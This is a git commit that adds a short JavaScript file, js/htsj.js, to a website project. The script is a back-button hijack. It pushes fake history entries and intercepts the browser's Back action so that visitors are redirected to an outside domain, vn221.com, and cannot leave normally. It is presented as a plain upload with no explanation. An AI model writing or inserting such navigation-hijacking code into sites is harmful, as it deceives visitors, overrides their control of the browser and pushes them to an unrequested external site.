add6c547acf9d7852af8730d782ee51fd766fd01
vn667 <86347378+vn667@users.noreply.github.com>
2021-06-23 16:44:22 +0800

    Add files via upload

---
+++ js/htsj.js
@@ -0,0 +1,25 @@
+﻿  $(document).ready(function(){      
+    
+     window.addEventListener("popstate",
+         function(e) {
+         location="https://vn221.com"      
+     }, false);
+
+    pushHistory();
+    window.addEventListener("popstate", function (e) {
+         pushHistory();
+      
+        
+
+    }, false);
+
+
+        });   
+
+    function pushHistory() {
+        var state = {
+            title: "title",
+            url: "#"
+        };
+        window.history.pushState(state, "title", "#");
+    }
